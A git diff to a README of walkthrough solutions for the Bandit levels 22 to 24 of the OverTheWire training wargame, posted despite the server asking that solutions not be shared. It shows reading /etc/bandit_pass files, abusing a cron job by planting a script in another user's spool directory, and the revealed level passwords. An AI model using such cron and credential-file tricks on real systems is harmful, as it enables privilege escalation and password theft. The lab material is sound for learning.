@@ -1,5 +1,8 @@
 # Bandit Game Solutions
 
+**Note : I've just realised that in the welcome message to the server it states not to post solutions.
+I'm not entirely certain why they wouldn't want this but the game is a couple of years old now and there are seemingly other solutions out there so I'll leave this up here but... SPOILER WARNING :)**
+
 My solutions to the linux cli educational game Bandit <http://overthewire.org/wargames/bandit>.
 You are encouraged to complete this game for yourself even if you are a unix ninja but I'm putting up my answers here for posterity and discussion.
 
@@ -654,4 +657,114 @@ Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 
 ```
 ssh bandit22@bandit.labs.overthewire.org
+```
+
+As in the last question we can look at the `cron` task `/etc/cron.d/cronjob_bandit23` and then look at the resulting script file.
+
+```
+cat /usr/bin/cronjob_bandit23.sh
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+```
+
+This script file defines two variables `myname` which calls the function `whoami` which outputs the current user name.
+The second is `mytarget` which takes the string `I am user $myname` and then calculates the md5sum and removes anything after the first space.
+After these variables are calculated the script then takes the password for that user and writes it to `/tmp/$mytarget` which is a file named by the md5sum calculated earlier.
+
+The solution is fairly easy after reading what the script does we first need to find out what the `$mytarget` variable would be with bandit23.
+
+```
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+```
+
+Now we can find the password by looking for this file in the `/tmp` directory
+
+```
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+### Level 23 -> 24
+
+<http://overthewire.org/wargames/bandit/bandit24.html>
+
+```
+ssh bandit23@bandit.labs.overthewire.org
+```
+
+Here we want to write a shell script in a similar style to the one in the previous question.
+First lets see what the cronjob looks like
+
+```
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+```
+
+This cron task will run any executable file in `/var/spool/bandit24` and then delete it.
+Our job here is to write a script that will be run by bandit24 to write the password to a file accessible by bandit23.
+We should start by making a temporary directory to write our files to (and make it universally accessible and create our script.
+
+```
+mkdir -p /tmp/gordon24
+chmod -R 777 /tmp/gordon24
+
+cd /tmp/gordon24
+vim passme.sh
+```
+
+Script file
+
+```
+#!/bin/bash
+
+myname=$(whoami)
+
+cat /etc/bandit_pass/$myname > /tmp/gordon24/pass24
+```
+
+We need to make this script executable and then we should copy it to the target directory of the cronjob and wait.
+
+```
+chmod 777 passme.sh
+cp ./passme.sh /var/spool/bandit24/
+```
+
+After less than 1 minute the `cron` task will run and hopefully write the password to our temporary file `pass24`.
+
+```
+cat ./pass24
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+### Level 24 -> 25
+
+<http://overthewire.org/wargames/bandit/bandit25.html>
+
+```
+ssh bandit24@bandit.labs.overthewire.org
 ```
